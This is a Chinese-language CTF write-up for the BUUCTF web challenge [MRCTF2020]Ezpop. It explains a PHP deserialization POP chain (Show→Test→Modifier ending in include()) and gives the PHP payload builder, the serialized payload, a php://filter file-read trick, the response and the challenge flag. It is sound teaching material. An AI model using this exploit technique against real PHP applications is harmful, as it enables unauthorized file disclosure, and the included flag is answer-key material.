---

title: "[MRCTF2020]Ezpop"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [php-deserialization, pop-chain, file-inclusion, magic-methods]
vulnerability: PHP 反序列化 POP 链利用，通过魔术方法链实现任意文件包含
solved: true
flag: "flag{2d282df5-0fad-42a6-9035-537029777aeb}"
---

# [MRCTF2020]Ezpop

## 题目概述
题目提供了三个 PHP 类（Modifier、Show、Test），通过 GET 参数 `pop` 接收序列化数据并执行 `unserialize()`。flag 在 `flag.php` 中，需要构造 POP 链读取。

## 信息收集
- 访问题目得到源码，包含三个类和一个反序列化入口
- 注释提示 flag 在 `flag.php`
- 入口点：`unserialize($_GET['pop'])`

## 漏洞分析（漏洞类型、原理、判断过程）

**POP 链构造：**

| 类 | 魔术方法 | 触发条件 | 作用 |
|---|---|---|---|
| Modifier | `__invoke()` | 对象被当作函数调用 | 执行 `include($this->var)` |
| Test | `__get($key)` | 访问不存在的属性 | 返回 `$this->p()` |
| Show | `__toString()` | 对象被转为字符串 | 返回 `$this->str->source` |
| Show | `__wakeup()` | 反序列化时自动调用 | `preg_match` 对 `$this->source` 匹配 |

**链路：**
```
unserialize() 
  → Show::__wakeup() (preg_match 将 $this->source 转字符串)
    → Show::__toString() (访问 $this->str->source)
      → Test::__get('source') (Test 无 source 属性)
        → $this->p() (将 Modifier 对象当函数调用)
          → Modifier::__invoke()
            → include($this->var) (文件包含)
```

## 利用过程（Payload + Flag）

```php
<?php
class Modifier {
    protected $var = 'php://filter/read=convert.base64-encode/resource=flag.php';
}
class Show { public $source; public $str; }
class Test { public $p; }

$m = new Modifier();
$t = new Test();
$s = new Show();
$t->p = $m;           // Test::p = Modifier (触发 __invoke)
$s->str = $t;         // Show::str = Test (触发 __get)
$s->source = $s;      // Show::source = Show 自身 (触发 __toString)
echo urlencode(serialize($s));
```

**Payload:**
```
O:4:"Show":2:{s:6:"source";r:1;s:3:"str";O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:6:"\x00*\x00var";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}}}
```

**响应 (Base64):**
```
PD9waHAKY2xhc3MgRmxhZ3sKICAgIHByaXZhdGUgJGZsYWc9ICJmbGFnezJkMjgyZGY1LTBmYWQtNDJhNi05MDM1LTUzNzAyOTc3N2FlYn0iOwp9CmVjaG8gIkhlbHAgTWUgRmluZCBGTEFHISI7Cj8+
```

解码后得到 flag：`flag{2d282df5-0fad-42a6-9035-537029777aeb}`

## 复现步骤
1. 访问题目获取源码，分析三个类的魔术方法
2. 构造 POP 链：`Show::__wakeup` → `Show::__toString` → `Test::__get` → `Modifier::__invoke`
3. 使用 `php://filter` 伪协议绕过文件读取限制
4. URL 编码序列化字符串，通过 `?pop=` 参数发送
5. Base64 解码响应获取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---|---|---|---|
| PHP 反序列化 | `unserialize($_GET['pop'])` | POP 链 + php://filter | 魔术方法链、protected 属性序列化、对象引用(r:1) |

## 知识总结（解题技巧、同类题型套路）

1. **POP 链分析技巧**：从终点（危险函数）倒推，找到能触发它的魔术方法链
2. **常见魔术方法触发条件**：
   - `__wakeup`: 反序列化时
   - `__toString`: 对象转字符串（echo、字符串拼接、preg_match）
   - `__get`: 访问不存在属性
   - `__invoke`: 对象当函数调用
3. **protected 属性序列化**：格式为 `\x00*\x00属性名`，需 URL 编码
4. **对象引用**：`r:N` 表示引用第 N 个对象，用于循环引用
